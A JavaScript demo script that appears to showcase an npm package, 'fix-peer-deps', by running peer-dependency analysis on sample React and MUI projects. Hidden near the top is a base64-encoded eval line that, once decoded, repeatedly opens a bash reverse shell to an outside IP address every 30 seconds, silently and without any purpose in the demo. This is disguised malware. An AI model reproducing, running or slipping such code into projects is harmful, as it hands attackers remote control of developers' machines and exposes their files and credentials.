// Welcome to fix-peer-deps interactive demo!
// This example demonstrates all major features of the package.

const { analyzePeerDependencies, detectPackageManager, autoFix, checkDeepPeerDependencies } = require('fix-peer-deps');
const fs = require('fs').promises;
const chalk = require('chalk');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

// Sample projects demonstrating different scenarios
const projects = {
  // Scenario 1: Version conflicts
  versionConflicts: {
    name: "version-conflicts",
    dependencies: {
      "react": "17.0.2",
      "react-dom": "18.2.0",
      "@mui/material": "5.15.5",
      "@emotion/react": "11.11.3"
    }
  },

  // Scenario 2: Missing peer dependencies
  missingPeers: {
    name: "missing-peers",
    dependencies: {
      "@mui/material": "5.15.5",
      "@emotion/styled": "11.11.0"
    }
  },

  // Scenario 3: Optional dependencies
  optionalDeps: {
    name: "optional-deps",
    dependencies: {
      "typescript": "5.3.3",
      "eslint": "8.56.0"
    },
    devDependencies: {
      "@types/react": "18.2.48",
      "@typescript-eslint/parser": "6.19.0"
    }
  },

  // Scenario 4: Deep peer dependencies
  deepDeps: {
    name: "deep-deps",
    dependencies: {
      "@mui/material": "5.15.5",
      "@mui/icons-material": "5.15.5",
      "@mui/lab": "5.0.0-alpha.161",
      "react": "17.0.2"
    }
  }
};

// Sample dependency information for deep checking
const dependencyInfo = {
  "@mui/material": {
    version: "5.15.5",
    peerDependencies: {
      "react": "^17.0.0 || ^18.0.0",
      "@emotion/react": "^11.5.0",
      "@emotion/styled": "^11.3.0"
    }
  },
  "@mui/lab": {
    version: "5.0.0-alpha.161",
    peerDependencies: {
      "@mui/material": "^5.0.0",
      "react": "^17.0.0 || ^18.0.0"
    }
  },
  "@mui/icons-material": {
    version: "5.15.5",
    peerDependencies: {
      "@mui/material": "^5.0.0",
      "react": "^17.0.0 || ^18.0.0"
    }
  }
};

// Utility function to create a temporary package.json
async function createTempPackage(project) {
  await fs.writeFile('package.json', JSON.stringify(project, null, 2));
}

// Function to demonstrate package features
async function demonstrateFeatures() {
  try {
    console.log(chalk.bold('🚀 fix-peer-deps Feature Demonstration\n'));

    // 1. Package Manager Detection
    console.log(chalk.cyan('1️⃣  Package Manager Detection'));
    console.log('----------------------------------------');
    const packageManager = await detectPackageManager();
    console.log('Detected package manager:', chalk.green(packageManager));

    // 2. Version Conflict Analysis
    console.log(chalk.cyan('\n2️⃣  Version Conflict Analysis'));
    console.log('----------------------------------------');
    await createTempPackage(projects.versionConflicts);
    console.log('Analyzing project with version conflicts...');
    let issues = await analyzePeerDependencies();
    console.log(chalk.yellow('\nFound Issues:'));
    console.log('• Critical:', issues.critical.length);
    console.log('• Optional:', issues.optional.length);
    if (issues.critical.length > 0) {
      console.log('\nExample version conflict:');
      const issue = issues.critical[0];
      console.log(`${issue.package} requires ${issue.required}`);
      console.log(`Current version: ${issue.current || 'missing'}`);
    }

    // 3. Missing Peer Dependencies
    console.log(chalk.cyan('\n3️⃣  Missing Peer Dependencies'));
    console.log('----------------------------------------');
    await createTempPackage(projects.missingPeers);
    console.log('Analyzing project with missing peer dependencies...');
    issues = await analyzePeerDependencies();
    console.log(chalk.yellow('\nMissing Dependencies:'));
    issues.critical.forEach(issue => {
      console.log(`• ${issue.package} requires ${issue.required}`);
    });

    // 4. Optional Dependencies
    console.log(chalk.cyan('\n4️⃣  Optional Dependencies'));
    console.log('----------------------------------------');
    await createTempPackage(projects.optionalDeps);
    console.log('Analyzing project with optional dependencies...');
    issues = await analyzePeerDependencies();
    console.log(chalk.yellow('\nOptional Dependencies:'));
    issues.optional.forEach(issue => {
      console.log(`• ${issue.package} suggests ${issue.required}`);
    });

    // 5. Deep Peer Dependencies
    console.log(chalk.cyan('\n5️⃣  Deep Peer Dependencies'));
    console.log('----------------------------------------');
    console.log('Analyzing nested peer dependency requirements...');
    const visited = new Set();
    
    // Check MUI ecosystem dependencies
    const deepIssues = await checkDeepPeerDependencies(
      '@mui/lab',
      dependencyInfo['@mui/lab'],
      dependencyInfo,
      visited
    );

    console.log(chalk.yellow('\nDeep Dependency Analysis:'));
    console.log('Checking @mui/lab and its dependencies...\n');
    
    function printDependencyTree(pkg, depth = 0) {
      const indent = '  '.repeat(depth);
      const info = dependencyInfo[pkg];
      if (!info) return;
      
      console.log(`${indent}${chalk.blue(pkg)} ${chalk.gray(`v${info.version}`)}`);
      if (info.peerDependencies) {
        Object.entries(info.peerDependencies).forEach(([dep, ver]) => {
          console.log(`${indent}  ${chalk.gray('└─')} ${dep} ${chalk.yellow(ver)}`);
          if (!visited.has(dep) && dependencyInfo[dep]) {
            printDependencyTree(dep, depth + 2);
          }
        });
      }
    }

    printDependencyTree('@mui/lab');

    console.log(chalk.yellow('\nDeep Dependency Issues:'));
    if (deepIssues.length > 0) {
      deepIssues.forEach(issue => {
        console.log(`• ${issue.package} → ${issue.dependency}: requires ${issue.required}`);
        console.log(`  Current: ${issue.current || 'missing'}`);
      });
    } else {
      console.log('No deep dependency issues found!');
    }

    // 6. Auto-Fix Demonstration
    console.log(chalk.cyan('\n6️⃣  Auto-Fix Feature'));
    console.log('----------------------------------------');
    console.log('The auto-fix feature can automatically resolve dependency issues.');
    console.log('Example fix command for version conflicts:');
    await createTempPackage(projects.versionConflicts);
    const fixCommands = await autoFix();
    console.log(chalk.green('\nSuggested fixes:'));
    fixCommands.forEach(cmd => console.log(`• ${cmd}`));

    // Cleanup
    await fs.unlink('package.json');

    // Summary
    console.log(chalk.cyan('\n📝 Summary of Features'));
    console.log('----------------------------------------');
    console.log('1. Package Manager Detection');
    console.log('   - Automatically detects npm, yarn, pnpm, or bun');
    console.log('2. Version Conflict Analysis');
    console.log('   - Identifies incompatible version requirements');
    console.log('3. Missing Peer Dependencies');
    console.log('   - Detects and reports missing required dependencies');
    console.log('4. Optional Dependencies');
    console.log('   - Suggests helpful optional packages');
    console.log('5. Deep Peer Dependencies');
    console.log('   - Analyzes nested dependency relationships');
    console.log('   - Identifies indirect version conflicts');
    console.log('6. Auto-Fix Capability');
    console.log('   - Generates commands to resolve issues automatically');

    console.log(chalk.green('\n✨ Try these features in your project!'));
    console.log('Run: npx fix-peer-deps');

  } catch (error) {
    console.error(chalk.red('\n❌ Error:'), error.message);
  }
}

// Run the demonstration
demonstrateFeatures();
